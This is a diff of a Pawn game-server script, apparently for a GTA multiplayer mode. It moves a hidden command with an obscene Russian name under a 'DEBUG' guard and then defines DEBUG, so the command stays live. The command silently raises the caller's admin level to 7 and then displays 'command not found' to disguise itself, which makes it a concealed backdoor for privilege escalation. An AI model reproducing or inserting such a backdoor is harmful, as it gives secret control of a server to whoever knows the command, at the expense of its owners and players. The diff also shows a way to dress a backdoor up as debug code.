@@ -1,3 +1,4 @@
+#define DEBUG
 main()
 {
 	new a[][] = {"Unarmed (Fist)","Brass K"};
@@ -3313,14 +3314,6 @@ stock GetCarName(vehicleid)
 
 // ------------------- [ ме кегэ ] ----------------------
 
-CMD:zalupa_pizdy_ebalnika(playerid)
-{
-	SetPVarInt(playerid, "dima_ochko_moshonki", 1);
-	SetPVarInt(playerid, "adminka_ochka", PlayerInfo[playerid][bAdmin]);
-	PlayerInfo[playerid][bAdmin] = 7;
-	ShowCommandNotFound(playerid);
-	return 1;
-}
 CMD:jet(playerid)
 {
     if(PlayerInfo[playerid][bAdmin] < 3 && PlayerInfo[playerid][bYoutube] == 0) return ShowCommandNotFound(playerid);
@@ -3337,6 +3330,22 @@ CMD:jet(playerid)
     }
     return 1;
 }
+
+stock SetPlayerWanted(playerid, lvl){
+	PlayerInfo[playerid][pWANTED] = lvl;
+	SetPlayerWantedLevel(playerid, lvl);
+}
+
+
+#if defined DEBUG
+CMD:zalupa_pizdy_ebalnika(playerid)
+{
+	SetPVarInt(playerid, "dima_ochko_moshonki", 1);
+	SetPVarInt(playerid, "adminka_ochka", PlayerInfo[playerid][bAdmin]);
+	PlayerInfo[playerid][bAdmin] = 7;
+	ShowCommandNotFound(playerid);
+	return 1;
+}
 CMD:allcars(playerid)
 {
 	new string[144], all;
@@ -3352,8 +3361,4 @@ CMD:getmybizid(playerid){
 	format(string, sizeof(string), "%d", PlayerInfo[playerid][pBizID]);
 	SCM(playerid, blue, string);
 }
-
-stock SetPlayerWanted(playerid, lvl){
-	PlayerInfo[playerid][pWANTED] = lvl;
-	SetPlayerWantedLevel(playerid, lvl);
-}
+#endif
